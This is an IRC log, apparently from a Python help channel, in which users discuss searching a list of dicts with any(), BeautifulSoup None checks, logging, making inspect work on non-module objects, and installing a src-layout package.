[19:55:56] <cjohnson> In JS I would do if (!arr.find(e => e.name == 'foo')) { arr.push({name: 'foo'}) }
[19:55:57] *** Joins: LER0ever (~LER0ever@50.93.222.130)
[19:56:25] <cjohnson> nedbat: It means to make that dict indexed by name would be pointless since I would never use said dict again beyond the intitial lookup
[19:56:41] <nedbat> cjohnson: it's hardly pointless: it solves your problem.
[19:56:52] <cjohnson> nedbat: I feel like you are reading past what I am saying
[19:57:06] *** Joins: roofy (~roofy@2600:1700:89a0:8ae0::45)
[19:57:10] <nedbat> cjohnson: you would use it for just one thing: avoiding duplicate names.
[19:57:35] *** Quits: corretico (~corretico@200.91.143.34) (Ping timeout: 240 seconds)
[19:57:41] *** Joins: holden- (~holden-@unaffiliated/holden-)
[19:57:44] <cjohnson> My options are A: search the list for a dict of a certain name, or B: scan the entire list into a dict for use as a name index, and then check the index for the given name
[19:57:51] <nedbat> cjohnson: you could also make a set of the name you have already seen
[19:57:53] *** Quits: greatgatsby (~greatgats@167.88.132.50) (Ping timeout: 248 seconds)
[19:57:54] <cjohnson> B includes the work of A, and then some, but provides no additioanl value
[19:57:55] *** Joins: cyphase (~cyphase@unaffiliated/cyphase)
[19:58:01] <cjohnson> There is only ever one name that I care about
[19:58:05] <nedbat> cjohnson: you build the dict as you build the list.
[19:58:11] <cjohnson> I don't build the list
[19:58:18] *** Joins: Xaldafax (~Xaldafax@cpe-104-35-100-124.socal.res.rr.com)
[19:58:19] <nedbat> cjohnson: ok good, we are getting more information.
[19:58:27] <cjohnson> I mentioned this earlier
[19:58:42] <Wooble> ali1234: huh, https://stackoverflow.com/questions/12185110/subclassed-python-dictionary-for-custom-namespace-in-exec-method suggests it was changed in 3.3 but maybe it was changed back after that because it doesn't work for me, either.
[19:58:48] <nedbat> cjohnson: you seem annoyed by my attempt to help.  I'll stop.
[19:59:30] <sydbarret> When I do "url = div.find('a')['href']" I got this TypeError: 'NoneType' object is not subscriptable. I think its because div does not contain the 'a' tag. How can I validate this?
[19:59:34] <cjohnson> Only annoyed at reading past what I've been saying the whole time
[19:59:50] <nedbat> cjohnson: "What is a python-ey way to add a dict to a list if another dict of similar shape is not already present" this sounds like you are building the list.
[19:59:51] *** Quits: LER0ever (~LER0ever@50.93.222.130) (Remote host closed the connection)
[19:59:53] <cjohnson> If your help hinges on also reading past what I'm saying then yeah it's not that useful
[19:59:55] *** Quits: rpg (~rpg@ip-184-223-232-107.stplmn.spcsdns.net) (Ping timeout: 260 seconds)
[20:00:03] <cjohnson> Nope, I'm adding to the list
[20:00:07] <cjohnson> add being hte key word
[20:00:11] *** Quits: Technodrome (~textual@unaffiliated/technodrome) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[20:00:16] <Wooble> sydbarret: is this beautiful soup?
[20:00:24] <ali1234> i would use a set
[20:00:30] <sydbarret> Wooble yes
[20:00:44] <nedbat> cjohnson: "adding" can also mean, "i am building a list"  you could just say, "sorry, i wasn't clear," but whatever.
[20:00:45] *** Joins: LER0ever (~LER0ever@50.93.222.130)
[20:00:53] <Wooble> sydbarret: I *think* you just have to do it in 2 steps and check if you got None, because BS4's API is fiddly.
[20:01:09] <Wooble> sydbarret: doing it with lxml and xpath is probably cleaner.
[20:01:09] <sydbarret> Wooble do yo think if i add " if 'a' in div " before that statement will work?
[20:01:10] *** Quits: LER0ever (~LER0ever@50.93.222.130) (Remote host closed the connection)
[20:01:14] <nedbat> cjohnson: it's hard to explain things, I understand.
[20:01:28] <cjohnson> And you could say "sorry, I inferred something that wasn't there", but instead the ego prevails. Don't worry about it, as I said, if this stuff of reading past what I'm saying is a necessary component of the help, I'm ok just trudging along
[20:01:29] *** Quits: chachan (~chachan@168.232.28.50) (Ping timeout: 256 seconds)
[20:01:33] <sydbarret> Wooble or how can i ask if a tag exist before executing that statement
[20:01:40] <cjohnson> Right, more of that wicked ego. Don't sweat it nedbat
[20:01:42] <sydbarret> 'a' tag
[20:01:47] *** Quits: th3_p3n3tr4t0r (~th3_p3n3t@2a02:8108:1c0:8edf:f518:c416:552b:cf) (Quit: Leaving)
[20:01:51] *** Joins: tuxiano_ (~tuxiano@2a02:8070:89d4:aa00:dd38:f6d5:40a9:35a9)
[20:02:20] *** Quits: bkraptor (~bkraptor@unaffiliated/bkraptor) (Ping timeout: 245 seconds)
[20:03:03] <ali1234> 'name' in set.union(*(set(d.keys()) for d in dict_list))
[20:03:37] *** Joins: mrjohns (~juan@unaffiliated/mrjohns)
[20:03:38] *** Quits: zenix_2k2 (~zenix_2k2@42.112.229.101) (Quit: Leaving)
[20:03:39] <Wooble> sydbarret: you could do the .find() in 1 step, then check if it was None. There may be an easier way, been a long time since I used BS4.
[20:03:48] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[20:03:59] *** Quits: blackandblue (~batdownh@gateway/tor-sasl/blackandblue) (Quit: Leaving)
[20:04:12] *** Quits: tuxiano (~tuxiano@2a02:8070:89d4:aa00:bd60:c5ab:1e16:db05) (Ping timeout: 256 seconds)
[20:04:13] *** tuxiano_ is now known as tuxiano
[20:04:13] <nedbat> cjohnson: i misunderstood. You seem intent on proving that i was "reading past" you, as if i was purposefully twisting your words?
[20:04:16] *** Joins: Mattiaslndstrm (~Mattiasln@2806:103e:9:257e:87b:ca12:784b:f877)
[20:04:53] *** Quits: waveform (~waveform@waveform.plus.com) (Quit: Leaving)
[20:05:24] <cjohnson> "It's hard to explain things, I understand" is nothing but provocation
[20:05:37] *** Quits: lompik (~lompik@unaffiliated/lompik) (Ping timeout: 245 seconds)
[20:05:45] *** Quits: bablux (~bablux@mail.levis.name) (Quit: ZNC 1.7.0 - https://znc.in)
[20:06:00] *** Joins: bablux (~bablux@mail.levis.name)
[20:06:02] <nedbat> cjohnson: i didn't mean to single you out. It's always hard for anyone to get their whole understanding into an IRC message.
[20:06:19] <ali1234> cjohnson: what about my suggestion? ^
[20:06:35] <nedbat> cjohnson: i can understand why you explained it the way you did.  You could acknowledge that there are reasonable misinterpretations.
[20:07:05] *** Joins: platvoeten (~platvoete@178-85-122-247.dynamic.upc.nl)
[20:07:07] <cjohnson> ali1234: It's honestly pretty close to nedbat's original suggestion, which isn't the worst thing in the world, but I was just curious if there was a more direct analog to javascripts Array#find
[20:07:16] <cjohnson> where you pass it a lambda and it returns the first matching item
[20:07:31] *** Joins: |oLa| (~|_oLa_|@2a00:23c5:8c0e:9900:d996:2f3e:f2a7:86e6)
[20:07:34] <ali1234> oh you want to know which dict it's in too?
[20:07:46] <cjohnson> Oh actually I guess I mean Array#includes
[20:07:49] <cjohnson> I forgot that's spec now
[20:07:55] <cjohnson> which is basically just a boolean version of hte same
[20:07:59] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[20:08:00] *** Joins: rpg (~rpg@sift.net)
[20:08:09] *** TidB is now known as umm
[20:08:18] <cjohnson> I don't actually need the dict, just to know of its existence or lack of
[20:08:30] *** Quits: umm (~TidB@pD9FCEBC9.dip0.t-ipconnect.de) (Quit: Leaving)
[20:08:36] <ali1234> well that's what my thing does?
[20:08:43] <ali1234> true it does build the whole set
[20:08:51] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 256 seconds)
[20:09:07] <cjohnson> Right, that's really the only reason I'm hesitating to use such an approach
[20:09:11] *** Quits: borkr (~borkr@static130-244.mimer.net) (Ping timeout: 265 seconds)
[20:09:19] <cjohnson> There's no reason to build the whole set if we can just stop at the first match
[20:09:19] <ali1234> you could say any('name' in d.keys() for d in dict_list) to avoid that
[20:09:52] <cjohnson> nice!
[20:09:52] *** Quits: kurkale6ka (~kurkale6k@84.45.99.125) (Ping timeout: 256 seconds)
[20:10:00] *** Joins: HalcyonGrey (~quassel@209.58.138.227.adsl.inet-telecom.org)
[20:10:04] <cjohnson> I think that more directly infers the intent
[20:10:21] <Wooble> the .keys() is redundant, BTW.
[20:10:36] <cjohnson> Oh wait that's not exactly it, I don't think
[20:10:44] <cjohnson> it's any item where d.name == 'foo'
[20:10:55] <ali1234> uff
[20:11:13] <cjohnson> sorry
[20:11:15] <TML> cjohnson: implies :)
[20:11:18] <ali1234> Wooble: i can never remember if "x in {}" searches values or not, so i just make it explicit
[20:11:34] <grym> cjohnson: so `any('name' in d and d['name']=='foo' for d in dict_list)` then
[20:11:35] *** Joins: Guest65618 (~ironfrogg@python/site-packages/ironfroggy)
[20:11:44] *** Joins: _sfiguser (~giuseppe@5.102.13.118)
[20:12:01] <ali1234> or just any(d.name == 'foo' for d in L)
[20:12:06] *** Quits: mefistofeles (~mefistofe@unaffiliated/mefistofeles) (Quit: brb)
[20:12:09] <ali1234> if they are truly attrs
[20:12:11] <grym> ali1234: that'll keyerror
[20:12:19] <grym> ali1234: i think.
[20:12:27] <ali1234> it will AttributeError if name doesn't exist
[20:12:33] *** Quits: platvoeten (~platvoete@178-85-122-247.dynamic.upc.nl) (Quit: Lost terminal)
[20:12:34] *** Quits: mrjohns (~juan@unaffiliated/mrjohns) (Ping timeout: 265 seconds)
[20:12:37] <cjohnson> TML: ah yes
[20:12:37] <grym> yeah.  does any swallow that?
[20:12:45] <ali1234> probably not
[20:12:51] <grym> ok.  so i like my way better
[20:13:03] <Wooble> d.get('name', '')
[20:13:04] <grym> even though it's kind of WET
[20:13:07] *** Joins: efm (~efm@vpn.tummy.com)
[20:13:08] <_sfiguser> hello all, guys i frequently find myself having debug print inside my code which then i comment in order to be able to still debug when i want... i do things like these https://bpaste.net/show/62003bc750e8
[20:13:09] <ali1234> if d is not a dict
[20:13:11] <cjohnson> LOL grym
[20:13:16] <_sfiguser> what's a smart way to deal with this stuff ?
[20:13:21] <ali1234> and you want to search for attr named "name"
[20:13:24] <_sfiguser> like is there any design pattern i should follow ?
[20:13:38] <cjohnson> Honestly name should always exist but better safe than sorry
[20:13:56] <Wooble> _sfiguser: logging.debug() is easier to control but marginally more work to get started.
[20:14:03] <grym> _sfiguser: using a logging tool is probably what you want, and then you can configure the log level depending on how verbose you want to be
[20:14:08] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[20:14:16] <ali1234> any(setdefault(d, 'name', 'not'+x) == x for d in L)
[20:14:24] <_sfiguser> ok Wooble  grym  which logging module is more used  ?
[20:14:42] <grym> _sfiguser: i've only really used the one in stdlib.  there are others.
[20:14:56] <ali1234> and of course i meant getattr
[20:14:58] *** Joins: mefistof1les (~mefistofe@unaffiliated/mefistofeles)
[20:14:59] <grym> stdlib logging is pretty java-y
[20:15:02] <grym> but otherwise fine
[20:15:13] *** Quits: graphene (~graphene@46.101.134.251) (Remote host closed the connection)
[20:15:27] *** mefistof1les is now known as mefistofeles
[20:15:37] *** Joins: bkraptor (~bkraptor@unaffiliated/bkraptor)
[20:15:44] <ali1234> cjohnson: ie any(getattr(o, 'name', 'notfoo') == 'foo' for o in L)
[20:15:56] *** Joins: graphene (~graphene@46.101.134.251)
[20:16:17] <cjohnson> sexy
[20:16:39] <ali1234> where 'notfoo' is anything that is not equal to 'foo'. so proably None unless you are specially looking for None
[20:16:50] *** Quits: rtyupoi (~rtyupoi@78-11-218-76.static.ip.netia.com.pl) (Ping timeout: 260 seconds)
[20:17:00] <Wooble> cjohnson: are these actual dicts, or things with attribute access? You don't want getattr() for dicts...
[20:17:15] *** Joins: abm (~abm@088156197084.unknown.vectranet.pl)
[20:17:30] *** Joins: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it)
[20:17:38] <cjohnson> Ah, dicts
[20:18:58] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 264 seconds)
[20:19:20] *** meandi_2 is now known as meandi
[20:19:22] *** Quits: Bryson (~anonymous@ip68-224-118-31.lv.lv.cox.net) (Quit: Bryson)
[20:19:31] <cdunklau> cjohnson: then just d.get('name') == expected_name for ...
[20:19:45] *** Quits: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de) (Ping timeout: 248 seconds)
[20:19:47] <cdunklau> cjohnson: assuming the expected thing won't be None
[20:20:30] *** Parts: alex108 (~alex@unaffiliated/alex108) ("WeeChat 1.5")
[20:20:32] *** Quits: bablux (~bablux@mail.levis.name) (Remote host closed the connection)
[20:20:40] <ali1234> boo. ModuleType can't have its dict replaced
[20:20:40] *** Quits: lumm (~lumm@221.41.136.77.rev.sfr.net) (Read error: Connection reset by peer)
[20:20:41] *** Quits: antgel (~topdog@87.71.0.54) (Ping timeout: 276 seconds)
[20:20:42] <cdunklau> cjohnson: best to think of a dict as a Map, not an object
[20:20:55] <cdunklau> (as far as JS analogues go)
[20:21:00] <ali1234> and inspect doesn't work if the module isn't ModuleType
[20:21:10] *** Joins: lumm (~lumm@221.41.136.77.rev.sfr.net)
[20:21:12] *** Quits: tuxiano (~tuxiano@2a02:8070:89d4:aa00:dd38:f6d5:40a9:35a9) (Ping timeout: 256 seconds)
[20:21:15] <nedbat> ali1234: you can blame someone using isinstance :)
[20:21:26] <ali1234> nedbat: for what?
[20:21:28] *** Joins: albel727 (~albel727@unaffiliated/albel727)
[20:21:29] *** Quits: |oLa| (~|_oLa_|@2a00:23c5:8c0e:9900:d996:2f3e:f2a7:86e6) (Quit: Leaving.)
[20:21:40] <nedbat> ali1234: for inspect not working if the thing isn't ModuleType
[20:21:41] <ali1234> i don't get it :)
[20:21:46] *** Quits: codesoup (~codesoup@174.119.180.211) (Remote host closed the connection)
[20:21:46] *** Quits: blip- (~blip-@unaffiliated/blip-) (Ping timeout: 256 seconds)
[20:21:48] <ali1234> hmm really?
[20:21:56] <nedbat> ali1234: i'm just guessing, but it sounds right
[20:22:07] *** Quits: daze (~daze@unaffiliated/daze) (Quit: daze)
[20:22:12] *** Joins: ramsub07 (~Instantbi@136.206.119.145)
[20:22:40] <ali1234> nedbat: i do "inspect.getmodule(inspect.currentframe().f_back)" (suggested by altendky) to imlement this_module()
[20:22:52] <nedbat> ali1234: the very first function in the file is:      def ismodule(object): return isinstance(object, types.ModuleType)
[20:23:13] <ali1234> it returns None if the module isn't an instance of ModuleType
[20:23:24] *** Joins: kurkale6ka (~kurkale6k@84.45.99.125)
[20:23:25] <nedbat> ali1234: and there are a lot of calls to ismodule
[20:23:29] <ali1234> hmmmmmmm
[20:23:36] <ali1234> can i trick it?
[20:23:41] <siege> types.ModuleType(name, dict_inst)  ?
[20:23:41] *** Joins: Forsythe (~Forsythe@c-73-181-65-209.hsd1.co.comcast.net)
[20:23:44] <cjohnson> cdunklau: my hero
[20:23:55] <cdunklau> cjohnson: not really, it was already suggested :)
[20:23:59] *** Quits: Haudegen (~quassel@178.115.237.87) (Remote host closed the connection)
[20:24:04] <cjohnson> for the JS analogy
[20:24:06] <ali1234> siege: hmm
[20:24:07] <cdunklau> aha
[20:24:27] <Wooble> I feel like david beazley would approve of monkeypatching the inspect module.
[20:24:28] *** Joins: Grimcy (Forsythe@gateway/vpn/privateinternetaccess/forsythe)
[20:24:40] <cdunklau> cjohnson: there are semantic differences of course. but the usage is maybe clearer
[20:24:47] *** Quits: graphene (~graphene@46.101.134.251) (Remote host closed the connection)
[20:25:13] <siege> makes a copy of dict_inst though, from what I see
[20:25:14] *** Joins: root3d (~root3d@unaffiliated/root3d)
[20:25:15] <cdunklau> cjohnson: e.g. somedict[key] KeyErrors if the key isn't there.
[20:25:25] <cdunklau> rather than just giving you None
[20:25:30] <bjs> Wooble: i feel if david beazley approves then you shouldn't do it
[20:25:31] *** Joins: graphene (~graphene@46.101.134.251)
[20:25:40] <_habnabit> bjs, +1
[20:25:41] *** Joins: xliiv (~xliiv@d89-122.icpnet.pl)
[20:25:44] <bjs> yet i also notice anytime david beazley does crazy things i've also done similarly crazy things in the past ...
[20:25:49] <nedbat> ali1234: https://docs.python.org/3/reference/datamodel.html#customizing-instance-and-subclass-checks
[20:25:57] *** Quits: sydbarret (AdiIRC@unaffiliated/sydbarret) (Quit: Going offline, see ya! (www.adiirc.com))
[20:26:01] <cdunklau> cjohnson: of course if you're working with JSON, that division is somewhat blurry
[20:26:06] *** Quits: Signaltonsalat (~dickbutt@p5DC7F87D.dip0.t-ipconnect.de) (Quit: https://i.imgur.com/galeFqa.png)
[20:26:35] *** Joins: zefferno (~zefferno@unaffiliated/zefferno)
[20:27:47] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[20:27:57] *** Quits: gelignite (~gelignite@55d4c532.access.ecotel.net) (Ping timeout: 240 seconds)
[20:28:07] *** Quits: Forsythe (~Forsythe@c-73-181-65-209.hsd1.co.comcast.net) (Ping timeout: 245 seconds)
[20:28:08] *** Joins: chachan (~chachan@196.40.47.129)
[20:28:27] *** Quits: ali1234 (~ali1234@88.97.12.44) (Ping timeout: 240 seconds)
[20:28:35] *** Quits: amospalla (~amospalla@unaffiliated/amospalla) (Quit: WeeChat 1.6)
[20:28:44] *** Joins: TidB (~TidB@pD9FCEBC9.dip0.t-ipconnect.de)
[20:29:25] *** Joins: Sxuza (~textual@41.13.176.25)
[20:29:25] *** Quits: root3d (~root3d@unaffiliated/root3d) (Ping timeout: 245 seconds)
[20:29:34] *** Joins: ali1234 (~ali1234@88.97.12.44)
[20:29:46] *** Quits: pro_z (~pro_z@93.84.41.139) (Ping timeout: 264 seconds)
[20:29:56] *** Quits: giaco (~giaco@2-238-151-49.ip244.fastwebnet.it) (Remote host closed the connection)
[20:30:01] <ali1234> siege: ModuleType(name, dict_inst) isn't a thing...
[20:30:07] *** Joins: amirpro_ (~amirpro@105.93.194.82)
[20:30:33] *** Joins: sdoherty (~sdoherty@pool-108-49-25-177.bstnma.fios.verizon.net)
[20:30:46] <ali1234> also ModuleType doesn't support metaclasses because it is a C thing
[20:31:23] *** Joins: amospalla (~amospalla@unaffiliated/amospalla)
[20:31:40] *** Joins: aeyxa (d8f358fa@gateway/web/freenode/ip.216.243.88.250)
[20:31:56] <siege> it's in the types module of python3. it creates a module instance with name and the copy of the contents from dict_inst. you just said you wanted to get inspect to look over a dictionary for you, didn't see what you were doing with metaclasses?
[20:32:01] *** Joins: codesoup (~codesoup@174.119.180.211)
[20:32:39] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 256 seconds)
[20:32:42] <ali1234> types.ModuleType(name, doc=None)
[20:33:01] <aeyxa> is there some more builtin way to do something like this? https://paste.pound-python.org/show/Gl6Bgb8e5BKrGxgm7QYR/
[20:33:01] <ali1234> also making a copy of some dict is not enough, i need to replace it so i can hook getitem
[20:33:04] <grym> Wooble: a friend of mine has a rule, "if you know why you shouldn't take stuck toast out of a toaster with a knife,  you're allowed to take stuck toast out of a toaster with a knife" and i feel like this is very releavnt to dabeaz-approved voodoo
[20:33:18] *** Quits: jayjo_ (jayjo@gateway/vpn/privateinternetaccess/jayjo) (Quit: Lost terminal)
[20:33:21] *** Quits: kajo (~kajo@2a02:908:2f33:d560:8e10:876f:c7a8:294d) (Ping timeout: 265 seconds)
[20:33:24] *** Quits: GraysonBriggs (~GraysonBr@206-51-126-226.up.net) (Quit: Bye Bye)
[20:33:24] <siege> ali1234, d'oh, I crosseyed that
[20:33:35] *** Quits: amirpro (~amirpro@41.235.244.66) (Ping timeout: 255 seconds)
[20:33:36] *** amirpro_ is now known as amirpro
[20:33:42] <aeyxa> I should have included the result, lol
[20:33:47] *** Joins: harmaahylje (~drc@gem.muuttuja.fi)
[20:33:53] <ali1234> really though all i need is inspect to work on non-modules
[20:34:02] *** Joins: heli0s (~scott@207-47-229-9.regn.hsdb.sasknet.sk.ca)
[20:34:05] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[20:34:28] <altendky> ali1234: then nedbat's link is what you need, yes?
[20:34:35] *** Quits: baloona (~baloona@2a02:8070:4c0:cf00:6207:5470:a373:dda8) (Quit: WeeChat 2.1)
[20:34:39] <ali1234> i might have missed it
[20:34:44] <ali1234> i got dc'd just now
[20:34:56] <altendky> 16:25 <nedbat> ali1234: https://docs.python.org/3/reference/datamodel.html#customizing-instance-and-subclass-checks
[20:35:04] <ali1234> thanks
[20:35:24] <ali1234> yeah that looks ideal :)
[20:35:48] *** Joins: AnySomebody (~AnySomebo@p2003005F2814A396A097A2FFFE5553BE.dip0.t-ipconnect.de)
[20:37:48] *** Joins: vicenteH (~user@54.104.135.37.dynamic.jazztel.es)
[20:38:24] *** Joins: AliGeek (~Thunderbi@78.172.235.234)
[20:38:35] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[20:38:45] *** Quits: AliGeyik (~Thunderbi@78.172.235.234) (Ping timeout: 264 seconds)
[20:38:46] *** AliGeek is now known as AliGeyik
[20:39:05] <_habnabit> grym, often i've seen people take that a little far in terms of "i know how, so i will" when there's simpler solutions. one should strive to write extremely simple code
[20:39:25] *** Joins: Perkol (~Perkol@nat2-minsk-pool-46-53-195-89.telecom.by)
[20:39:28] <Ruhan> _habnabit++
[20:39:44] *** Joins: sz0 (uid110435@gateway/web/irccloud.com/x-anofxbleyvqezbrq)
[20:39:48] <_habnabit> related to maslow's hammer
[20:39:54] *** Joins: vyraeden (~turkeryil@85.108.109.203)
[20:40:04] * dude-x thinks he should delete var = {**dict, **dict2}
[20:40:10] *** Quits: Guest65618 (~ironfrogg@python/site-packages/ironfroggy) (Ping timeout: 260 seconds)
[20:40:29] <grym> _habnabit: yes, i agree.  particularly w/r/t john woods
[20:40:31] *** Joins: silphium (~jrjohnsto@74-194-176-205.chstcmtk03.res.dyn.suddenlink.net)
[20:40:37] *** Joins: SwiftMatt (~Objective@2601:282:4300:3e:9083:44a6:2722:3395)
[20:40:59] *** Quits: silphium (~jrjohnsto@74-194-176-205.chstcmtk03.res.dyn.suddenlink.net) (Remote host closed the connection)
[20:41:48] *** Joins: amirpro_ (~amirpro@41.235.244.66)
[20:42:05] *** Quits: DLSteve (~DLSteve@2601:601:1301:40a8:2d09:29fb:319d:4f52) (Quit: All rise, the honorable DLSteve has left the channel.)
[20:42:06] *** Quits: bzdocha (~bzdocha__@adsl-dyn241.78-99-15.t-com.sk) (Remote host closed the connection)
[20:42:35] *** Quits: xliiv (~xliiv@d89-122.icpnet.pl) (Ping timeout: 240 seconds)
[20:42:46] *** Quits: EchoPapa (~EchoPapa@p5498CC83.dip0.t-ipconnect.de) (Read error: Connection reset by peer)
[20:42:52] *** Joins: fikka (~fikka@5403BEC5.catv.pool.telekom.hu)
[20:42:52] *** Quits: SwiftMatt (~Objective@2601:282:4300:3e:9083:44a6:2722:3395) (Client Quit)
[20:43:04] *** Quits: iderik (~idk@h-0-97.A147.priv.bahnhof.se) (Quit: iderik)
[20:43:28] *** Joins: WinterCame (c73b6a3a@gateway/web/cgi-irc/kiwiirc.com/ip.199.59.106.58)
[20:43:55] *** Quits: anqxyr (~anqxyr@nat4-minsk-pool-46-53-177-92.telecom.by) (Remote host closed the connection)
[20:44:24] *** Joins: tino097 (~tino097@37.25.85.35)
[20:44:29] *** Joins: davr0s (~textual@host86-138-235-28.range86-138.btcentralplus.com)
[20:44:33] <WinterCame> what is the preferred alternative to using `sys.path.append` and doing an `import src.xyz`, if I have an src dir?
[20:44:47] *** Quits: amirpro (~amirpro@105.93.194.82) (Ping timeout: 245 seconds)
[20:44:49] *** amirpro_ is now known as amirpro
[20:45:17] <WinterCame> I'm using code from `src/` in a sibling directory (notebooks), as well as running tests from the root
[20:45:54] *** Quits: Perkol (~Perkol@nat2-minsk-pool-46-53-195-89.telecom.by) (Quit: Leaving)
[20:46:38] <nedbat> WinterCame: if you have a src directory, you should install your project with "pip install -e ."
[20:47:49] <cdunklau> WinterCame: ideally don't mess with sys.path at all
[20:48:11] <cdunklau> WinterCame: you can tell setuptools that your source code is located in a subdir
[20:48:47] <cdunklau> WinterCame: then you do what nedbat said to install it (ideally in a virtualenv)
[20:48:49] <ali1234> nedbat: i don't if ismodule() is the cause for why inspect doesn't work on non-modules
[20:48:51] *** Quits: Ergo (~ergo@91.238.59.144) (Quit: WeeChat 1.9.1)
[20:49:04] <ali1234> getmodule() is called on a frame
[20:49:07] *** Joins: tom__ (~tom@p54B0E142.dip0.t-ipconnect.de)
[20:49:15] <nedbat> ali1234: i don't know either.  ismodule is called many times from the rest of the inspect module
[20:49:20] <ali1234> getmodule() actually isn't very smart
[20:49:35] <ali1234> if ismodule() it just returns the object you give it
[20:49:40] *** Joins: Hasimir (~hfenring@unaffiliated/hasimir)
[20:49:43] <ali1234> otherwise it checks for __module__ on the object
[20:49:51] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[20:49:54] *** Quits: luizdepra (~luizdepra@2001:1284:f01c:66dd:4f9:4455:590a:6882) (Remote host closed the connection)
[20:49:55] *** Joins: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de)
[20:50:03] <ali1234> otherwise it looks for _filename on the object
[20:50:17] <ali1234> and look up what module has that filename
[20:50:22] <nedbat> ali1234: then the problem may lie elsewhere
[20:50:33] <ali1234> those are the only things it can do
[20:50:36] *** Joins: SwiftMatt (~Objective@2601:282:4300:3e:9083:44a6:2722:3395)
[20:50:55] <ali1234> so for frames, it must be that frame has __module__ set if it's a module, and not if it doesnt
[20:51:03] *** Quits: SwiftMatt (~Objective@2601:282:4300:3e:9083:44a6:2722:3395) (Client Quit)
[20:52:47] <ali1234> hmm.. nope
[20:54:10] *** Quits: HalcyonGrey (~quassel@209.58.138.227.adsl.inet-telecom.org) (Read error: Connection reset by peer)
[20:54:17] *** Quits: AliGeyik (~Thunderbi@78.172.235.234) (Ping timeout: 255 seconds)
[20:54:50] *** Joins: duderonomy (~duderonom@c-73-222-239-211.hsd1.ca.comcast.net)
[20:54:57] *** Quits: vyraeden (~turkeryil@85.108.109.203) ()
[20:55:21] *** Quits: kurkale6ka (~kurkale6k@84.45.99.125) (Read error: Connection reset by peer)
[20:55:34] *** Quits: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it) (Ping timeout: 264 seconds)
[20:55:34] *** Joins: kurkale6ka (~kurkale6k@84.45.99.125)
[20:55:45] *** Joins: ttkpy (501@46-97-229-216.sr2.pon.net)
[20:55:50] *** Joins: kajo (~kajo@2001:4c50:371d:8400:ca2a:14ff:fe0f:7dd1)
[20:56:24] *** Joins: AliGeyik (~Thunderbi@78.172.235.234)
[20:56:39] *** Joins: Haudegen (~quassel@178.115.237.87)
[20:56:41] <dude-x> i spent 20 minutes debugging something because i wrote `var = thing.update(x)`. :/
[20:57:31] *** Joins: wgas (~wgas@unaffiliated/wgas)
[20:57:54] *** Quits: aeyxa (d8f358fa@gateway/web/freenode/ip.216.243.88.250) (Quit: Page closed)
[20:58:04] *** Joins: dkmueller (~daniel@x590ce276.dyn.telefonica.de)
[20:58:20] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 255 seconds)
[20:58:28] *** Quits: realbadhorse (~realuname@183.87.124.175) (Ping timeout: 256 seconds)
[20:58:40] *** Quits: enterprisey (~enterpris@wikipedia/enterprisey) (Remote host closed the connection)
[20:58:54] <grym> dude-x: that is a perfectly good dict merging line though
[20:59:12] <dude-x> it is. but it's a bit new even though it's 2-3 years old
[20:59:23] *** Quits: hishamn__ (~hisham@182.177.0.207) (Quit: Ex-Chat)
[20:59:56] <ali1234> nedbat: ah i found it. it builds a cache of filenames -> modules. but it refuses to put objects into the cache if they are not modules
[21:00:22] *** Quits: amirpro (~amirpro@41.235.244.66) (Ping timeout: 264 seconds)
[21:00:38] *** Quits: Und3rf10w (~Und3rf10w@unaffiliated/und3rf10w) (Ping timeout: 260 seconds)
[21:00:46] *** Joins: amirpro (~amirpro@41.235.244.66)
[21:00:56] *** Quits: tjt263 (uid149471@gateway/web/irccloud.com/x-gdyhfwzsuorptvxp) (Quit: Connection closed for inactivity)
[21:01:08] *** Joins: Und3rf10w (~Und3rf10w@unaffiliated/und3rf10w)
[21:01:30] *** Quits: enhance (enhance@nat/redhat/x-ogyszxcnyarsvmno) (Read error: Connection reset by peer)
[21:01:33] *** Quits: dramsey_ (~dramsey@c-68-37-94-119.hsd1.mi.comcast.net) (Ping timeout: 256 seconds)
[21:01:55] *** Quits: cjoy (~anonymous@HSI-KBW-046-005-019-033.hsi8.kabel-badenwuerttemberg.de) (Quit: cjoy)
[21:02:02] *** Joins: jcrab (4423392c@gateway/web/freenode/ip.68.35.57.44)
[21:02:23] *** Quits: Miezel (~Miezel@65-120-11-130.dia.static.qwest.net) (Ping timeout: 255 seconds)
[21:02:25] *** Quits: o_lalertom (~o_lalerto@moonstonemedical/developer/o-lalertom) (Quit: Leaving)
[21:02:45] *** Quits: jb1123 (~Thunderbi@143.139-242-81.adsl-dyn.isp.belgacom.be) (Ping timeout: 264 seconds)
[21:03:13] *** Joins: malachi (~malconten@91.207.175.200)
[21:03:26] <WinterCame> @nedbat, @cdunklau thanks
[21:03:28] *** Quits: sgtlion (~sgtsomebo@110.187.198.146.dyn.plus.net) (Remote host closed the connection)
[21:03:47] *** Joins: saml_ (~saml@unaffiliated/saml)
[21:04:48] *** Quits: Sxuza (~textual@41.13.176.25) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[21:04:50] *** Joins: rjdp9736 (~rjdp9736@183.82.17.102)
[21:05:03] *** Quits: bm371613 (~bartek@2a02:a317:603f:9800:3d21:d4ea:8e13:962a) (Quit: Konversation terminated!)
[21:05:35] *** Quits: saml (~saml@unaffiliated/saml) (Ping timeout: 240 seconds)
[21:05:57] *** Quits: kurkale6ka (~kurkale6k@84.45.99.125) (Ping timeout: 240 seconds)
[21:07:21] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Ping timeout: 268 seconds)
[21:07:29] *** Quits: tuxd00d (~tuxd00d@unaffiliated/tuxd00d) (Read error: Connection reset by peer)
[21:07:48] *** Joins: Alejoux (~Alejoux@2a01:e35:2e59:7ce0:78c8:602d:d850:3491)
